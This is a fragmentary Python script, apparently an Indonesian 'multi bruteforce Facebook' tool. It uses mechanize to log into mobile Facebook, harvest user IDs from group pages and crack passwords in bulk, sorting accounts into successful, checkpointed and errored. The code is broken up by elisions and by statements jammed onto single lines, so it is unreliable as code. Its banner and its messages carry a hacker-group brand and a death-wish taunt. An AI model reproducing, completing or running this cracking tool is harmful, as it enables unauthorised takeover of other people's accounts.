...
br.set_handle_equiv(True) br.set_handle_referer(True)
br.set_cookiejar(cookielib.LWPCookieJar())
br.set_handle_redirect(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1) br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
def bacaData():
...
def inputM(x,d):
	...
	if len(id_bteman) != 0:
		...
		try:
			...
			tampil('\rm[!]Gagal meyimpan') def buka(d): 	tampil('\rh[*]Membuka \rp'+d)
	try:
		x = br.open(d)
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		tampil('\rh[*]Selamat mencoba vankee \rk%s\n\rh[*]Semoga esok adalah hari kematianmu mu....'%nama)
		log = 1
	elif 'checkpoint' in url:
		tampil('\rm[!]Akun kena checkpoint\n\rk[!]Coba hubungi Lahadu contact centre')
		keluar()
	else:
...
def saring_id_group1(d):
	for i in re.findall(r'<h3><a href="/(.*?)fref=pb',d):
		...
		if a not in id_bgroup:
			tampil('\rk==>\rc%s'%a) 			id_bgroup.append(a)
...
def idgroup():
	...
	while 1:
		...
		try:
			...
			break
	simpan() 	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
	if i.upper() == 'Y':
	...
	if i.upper() == 'P':
		while 1:
			...
			try:
				...
				tampil('\rm[!]Gagal membuka \rk%s'%dir) 				continue
			break
...
def crack0(data,sandi,p):
	...
	print('\033[32;1m[*]Cracking \033[31;1m[\033[36;1m0%\033[31;1m]\033[0m',end='') 	os.sys.stdout.flush()
	akun_jml = []
	akun_sukses = []
	akun_cekpoint = []
	akun_error = []
...
['] /'|'\ \\
/ \ \ '
\_ \_ \_ \rk*\LahaduUnderground Cyber
\rk###########################################################
# \rb*MULTY BRUTEFORCE FACEBOOK*\rk #
# \rhBY\rp RUZTAM \rk#
# \rhGroup FB\rp https://m.facebook.com/groups/164201767529837 \rk#
# \rhGitHub\rp https://github.com/DarkPak000 \rk#
# \rmIzin Dulu Kepada Pemilik Sebelum Penggunaan \rk#
###########################################################''')
